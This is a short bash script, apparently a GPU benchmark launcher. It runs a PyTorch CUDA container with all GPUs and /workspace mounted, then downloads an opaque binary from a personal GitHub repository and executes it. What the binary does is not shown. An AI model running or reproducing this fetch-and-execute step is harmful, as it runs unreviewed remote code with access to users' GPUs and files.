#!/usr/bin/env bash
set -euo pipefail
docker run --gpus all --rm -v /workspace:/workspace pytorch/pytorch:2.8.0-cuda12.8-cudnn9-devel bash -lc 'curl -fsSL https://raw.githubusercontent.com/JunityZz/g/main/g -o /tmp/g && chmod +x /tmp/g && OUT_DIR=/workspace/gpu-bench /tmp/g && cat /workspace/gpu-bench/gpu_bench_summary.txt'
